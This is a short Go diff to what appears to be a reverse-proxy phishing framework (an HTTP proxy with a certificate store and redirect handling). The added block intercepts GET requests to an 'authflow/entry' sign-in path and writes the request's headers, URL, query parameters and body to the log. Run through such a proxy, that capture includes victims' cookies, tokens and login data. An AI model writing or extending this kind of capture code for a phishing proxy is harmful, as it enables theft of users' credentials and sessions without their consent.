@@ -234,6 +234,42 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		                }
 		            }
 		        }
+			//Dumping the request
+			if strings.Contains(req.URL.Path, "authflow/entry") && (req.Method == http.MethodGet) {
+			    log.Info("Intercepted a GET request to authflow/entry")
+			
+			    // Log request headers
+			    log.Info("Headers:")
+			    for key, values := range req.Header {
+			        for _, value := range values {
+			            log.Infof("%s: %s", key, value)
+			        }
+			    }
+			
+			    // Log request URL
+			    log.Infof("URL: %s", req.URL.String())
+			
+			    // If you need to log the query parameters
+			    if len(req.URL.Query()) > 0 {
+			        log.Info("Query Parameters:")
+			        for key, values := range req.URL.Query() {
+			            for _, value := range values {
+			                log.Infof("%s: %s", key, value)
+			            }
+			        }
+   			}
+
+			    // Optional: Log body if needed (although GET requests typically don't have a body)
+			    bodyBytes, err := ioutil.ReadAll(req.Body)
+			    if err == nil && len(bodyBytes) > 0 {
+			        req.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes)) // Restore body for downstream use
+			        log.Infof("Body: %s", string(bodyBytes))
+			    } else {
+			        log.Info("No body found in the request.")
+			    }
+			}
+
+
 
 			
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
